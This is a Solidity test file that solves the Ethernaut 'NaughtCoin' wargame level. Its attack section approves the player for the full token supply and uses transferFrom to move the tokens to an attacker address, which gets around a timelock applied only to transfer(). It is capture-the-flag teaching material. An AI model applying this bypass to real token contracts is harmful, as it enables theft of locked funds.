pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/levels/15_NaughtCoin/NaughtCoinFactory.sol";
import "../src/core/Ethernaut.sol";
import "./utils/vm.sol";
import "forge-std/console.sol";


contract NaughtCoinTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address attacker = address(100);
    

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal attacker address some ether
        vm.deal(attacker, 5 ether);
    }

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));
        // vm.stopPrank();


        //////////////////
        // LEVEL ATTACK //
        //////////////////

        uint supply = ethernautNaughtCoin.balanceOf(tx.origin);
        assertEq(ethernautNaughtCoin.allowance(tx.origin ,tx.origin), 0);
        // we approve tx.origin to spend the supply in order to use transferFrom which doesn't have the lockTokens modifier 
        ethernautNaughtCoin.approve(tx.origin, supply);
        assertEq(ethernautNaughtCoin.allowance(tx.origin ,tx.origin), supply);
        ethernautNaughtCoin.transferFrom(tx.origin, attacker, supply);
        
        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
